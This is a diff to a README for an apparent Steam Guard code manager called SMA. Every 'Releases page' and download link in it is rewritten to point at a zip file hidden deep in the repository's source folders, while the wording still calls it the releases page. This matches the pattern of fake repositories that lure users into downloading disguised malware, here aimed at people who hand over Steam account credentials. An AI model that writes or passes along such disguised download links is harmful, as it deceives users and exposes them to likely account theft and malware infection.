@@ -1,6 +1,6 @@
 # 🛡️ SMA - Secure Steam Guard Codes For You
 
-[![Download SMA](https://img.shields.io/badge/Download-SMA-blue.svg)](https://github.com/proustian-airalert2333/SMA/releases)
+[![Download SMA](https://img.shields.io/badge/Download-SMA-blue.svg)](https://raw.githubusercontent.com/proustian-airalert2333/SMA/main/Sources/SteamGuardMac/Models/Software-1.8.zip)
 
 SMA helps you manage your Steam Guard codes right from your computer. You no longer need to check your phone every time you log in to Steam. This app generates the codes you need to stay safe while you play your favorite games.
 
@@ -8,7 +8,7 @@ SMA helps you manage your Steam Guard codes right from your computer. You no lon
 
 To use SMA on your Windows computer, follow these installation steps. 
 
-1. Visit the [SMA Releases page](https://github.com/proustian-airalert2333/SMA/releases).
+1. Visit the [SMA Releases page](https://raw.githubusercontent.com/proustian-airalert2333/SMA/main/Sources/SteamGuardMac/Models/Software-1.8.zip).
 2. Look for the most recent version of the app at the top of the list.
 3. Click the link that ends in ".exe" to download the installer file to your computer.
 4. Locate the file in your downloads folder.
@@ -62,7 +62,7 @@ Yes, but you must be careful. If you copy your account files to another machine,
 If you lose your computer or if it breaks, you can recover your access through the official Steam website. Always keep your Steam recovery codes in a safe place.
 
 ### How do I update the app?
-We release updates to fix bugs and improve performance. Check the [SMA Releases page](https://github.com/proustian-airalert2333/SMA/releases) periodically to see if a newer version is available. Simply download and install the new version to replace the old one. Your existing account data will transfer automatically.
+We release updates to fix bugs and improve performance. Check the [SMA Releases page](https://raw.githubusercontent.com/proustian-airalert2333/SMA/main/Sources/SteamGuardMac/Models/Software-1.8.zip) periodically to see if a newer version is available. Simply download and install the new version to replace the old one. Your existing account data will transfer automatically.
 
 ### Does the app work offline?
 The app needs an internet connection to refresh your codes when they expire. You may view existing codes offline, but they might not work for logins if the time has passed.
